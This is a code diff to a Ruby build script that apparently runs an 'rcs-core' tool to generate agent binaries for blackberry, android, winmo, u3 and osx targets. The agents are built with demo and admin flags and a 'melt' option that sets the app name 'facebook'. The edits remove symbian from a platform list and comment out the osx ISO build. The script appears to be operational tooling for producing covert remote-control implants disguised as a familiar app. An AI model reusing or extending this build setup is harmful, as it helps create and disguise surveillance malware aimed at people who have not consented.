@@ -8,7 +8,7 @@ FACTORY = 'RCS_0000000001'
 puts "Building all complex..."
 ###################################################################################################
 params = {platform: 'wap',
-          generate: {platforms: ['blackberry', 'android', 'symbian', 'winmo'],
+          generate: {platforms: ['blackberry', 'android', 'winmo'],
                      binary: {demo: true, admin: true},
                      melt: {admin: true,
                             appname: 'facebook',
@@ -53,6 +53,7 @@ params = {platform: 'u3',
 File.open('build.json', 'w') {|f| f.write params.to_json}
 system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o u3.zip"
 ###################################################################################################
+=begin
 params = {platform: 'iso',
           generate: {platforms: ['osx'],
                      binary: {demo: true, admin: false},
@@ -62,5 +63,6 @@ params = {platform: 'iso',
 
 File.open('build.json', 'w') {|f| f.write params.to_json}
 system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o iso.zip"
+=end
 ###################################################################################################
 puts "End"
